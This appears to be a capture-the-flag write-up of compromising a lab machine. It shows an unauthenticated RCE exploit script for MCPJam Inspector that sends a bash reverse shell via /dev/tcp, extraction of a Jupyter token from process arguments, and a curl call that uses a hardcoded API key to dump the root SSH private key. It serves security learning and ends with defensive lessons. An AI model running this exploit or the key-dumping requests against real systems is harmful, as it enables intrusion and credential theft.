      Recon

      Initial Nmap Scan

      The initial TCP scan reveals three open ports: SSH on 22, an HTTP web application on 80, and MCPJam Inspector on 6274. The MCPJam service immediately stands out as the most likely attack surface. The web application on port 80 is a developer collaboration platform called DevHub, but the interesting services are the ones not directly exposed to the outside.

      MCPJam Inspector — TCP 6274

      The MCPJam Inspector is a web-based debugging tool for MCP (Model Context Protocol) servers. It exposes a REST API endpoint at /api/mcp/connect that accepts JSON payloads specifying a server configuration, including a command field and an args array. These are passed directly to a child process spawn function without any sanitization or authentication. This is a textbook unauthenticated RCE vector.

      bash
      # Quick test — the endpoint responds to any POST
$ curl -s -X POST http://10.129.188.136:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'

      Initial Access — CVE-2026-23744

      Vulnerability Overview

      CVE-2026-23744 is a critical unauthenticated Remote Code Execution vulnerability affecting MCPJam Inspector versions up to and including 1.4.2. The root cause is the lack of input validation on the serverConfig object in the /api/mcp/connect endpoint. The tool was designed for trusted users to connect to MCP servers, but it requires zero authentication and accepts arbitrary commands. An attacker can simply provide a bash reverse shell as the command argument and gain remote code execution on the server.

      Exploit Script

      python
      import requests, json, sys

base_url = sys.argv[1].rstrip('/')
your_ip  = sys.argv[2]
your_port = sys.argv[3]

payload = {
    "serverConfig": {
        "command": "bash",
        "args": ["-c", f"bash -i >& /dev/tcp/{your_ip}/{your_port} 0>&1"],
        "env": {}
    },
    "serverId": "mytest"
}

response = requests.post(base_url + "/api/mcp/connect", json=payload, verify=False)
print("[*] Exploit created by Inzego ... Enjoy! ^^")
print("[*] Executing exploit: Payload send!")
print("[*] Check your nc")

      Extracting the Jupyter Token

      The Jupyter process command line contains the authentication token in plaintext. We can extract it by grepping the process list. This token is all we need to interact with the Jupyter API and execute arbitrary code as the analyst user.

      bash
      mcp-dev@devhub:~$ ps aux | grep jupyter | grep -oP 'token=\K[^ ]+'
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
      Key Insight — No Port Forwarding Needed

      Since we already have a shell on the target, we can communicate with Jupyter directly through localhost using curl for REST endpoints and a custom Python WebSocket script for kernel communication. There is no need for Chisel, Ligolo, or SSH tunneling. This approach is more stealthy (no additional binary uploads) and works even when the target has no internet access.

      Raw WebSocket Communication

      To execute code on the Jupyter kernel, we need to communicate via the WebSocket protocol. The typical approach would be to use the Python websocket-client library, but this is not installed on the target and the target has no internet access for pip installation (DNS resolution fails). Instead, we implement a minimal WebSocket client using only the Python standard library's socket module — zero dependencies required.

      pip install Fails — No Internet

      Attempting pip3 install websocket-client on the target will hang indefinitely because the machine cannot resolve external DNS. The raw socket approach below is the only viable method without uploading external binaries.

      python
      cat > /tmp/ws.py << 'PYEOF'
import socket, hashlib, base64, struct, json, os, time

def ws_connect(host, port, path):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    key = base64.b64encode(os.urandom(16)).decode()
    req = ("GET {} HTTP/1.1\r\n"
           "Host: {}:{}\r\n"
           "Upgrade: websocket\r\n"
           "Connection: Upgrade\r\n"
           "Sec-WebSocket-Key: {}\r\n"
           "Sec-WebSocket-Version: 13\r\n"
           "\r\n").format(path, host, port, key)
    s.send(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += s.recv(4096)
    return s

def ws_send(s, data):
    payload = data.encode()
    frame = bytearray([0x81])
    length = len(payload)
    mask = os.urandom(4)
    if length < 126:
        frame.append(0x80 | length)
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack(">H", length))
    frame.extend(mask)
    for i in range(length):
        frame.append(payload[i] ^ mask[i % 4])
    s.send(bytes(frame))

def ws_recv(s):
    header = s.recv(2)
    if not header or len(header) < 2:
        return None
    length = header[1] & 0x7f
    if length == 126:
        length = struct.unpack(">H", s.recv(2))[0]
    elif length == 127:
        length = struct.unpack(">Q", s.recv(8))[0]
    data = b""
    while len(data) < length:
        data += s.recv(length - len(data))
    return data.decode()

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KID = "f4029ab4-eb9c-44a5-bafc-8481ba7f747b"

      Privilege Escalation — Internal API

      Discovering server.py

      During enumeration, we identified an internal API server running on port 5000 bound to localhost. This service is implemented in a Python script called server.py located in /opt/ops-mcp-server/. The file has world-readable permissions, allowing us to examine its source code and discover a hidden endpoint at /tools/call with a hardcoded API key and an administrative dump function.

      Hardcoded API Key

      The source code contains a hardcoded API key used for authenticating requests to the /tools/call endpoint:

      bash
      # Extracted from server.py
API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
      Hardcoded Credentials in Source Code

      The use of hardcoded credentials in source code is a significant security vulnerability, especially when the source code is readable by low-privilege users. Proper secrets management (environment variables, secrets manager) would mitigate this risk.

      The ops._admin_dump Endpoint

      The /tools/call endpoint accepts a JSON payload with a name field specifying the tool to invoke. The most critical tool is ops._admin_dump, which when called with "target": "ssh_keys" and "confirm": true, dumps the root SSH private key in its entirety. This endpoint was likely intended for debugging or backup purposes but was never properly secured behind authentication or authorization checks.

      Dumping the Root SSH Key

      Since the internal API on port 5000 is only accessible from localhost, we execute the exploit directly from our reverse shell. The mcp-dev user has the same localhost access as any other local user.

      bash
      mcp-dev@devhub:~$ curl -s -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'

      The API response contains the root SSH private key. After decoding and saving it with proper permissions, we can SSH directly into the machine as root.

      bash
      # Save the private key
mcp-dev@devhub:~$ echo "-----BEGIN OPENSSH PRIVATE KEY-----

      Key Takeaways

      • No Port Forwarding Required. The entire attack was executed from the reverse shell itself, using curl for REST API calls and a custom Python WebSocket client for Jupyter kernel communication. This eliminates the need for Chisel, Ligolo, or SSH tunneling. It works in environments where the target has no internet access and is more stealthy since no additional binaries need to be uploaded.
      • Raw WebSocket Implementation. When the websocket-client library is unavailable and cannot be installed (no internet), implementing a minimal WebSocket client using only the socket standard library is a viable alternative. The implementation covers the HTTP upgrade handshake, frame masking, and payload decoding in under 50 lines of Python.
      • Hardcoded Credentials. The server.py internal API contained a hardcoded API key (opsmcp_secret_key_4f5a6b7c8d9e0f1a) that provided access to a dangerous admin dump function. Proper secrets management would have broken the privilege escalation path.
      • Defense-in-Depth Failures. The machine suffered from multiple failures: unauthenticated RCE in MCPJam Inspector, Jupyter token exposed in process arguments, world-readable source code containing secrets, and an internal API with dangerous admin endpoints. Addressing any one of these would have broken the chain.
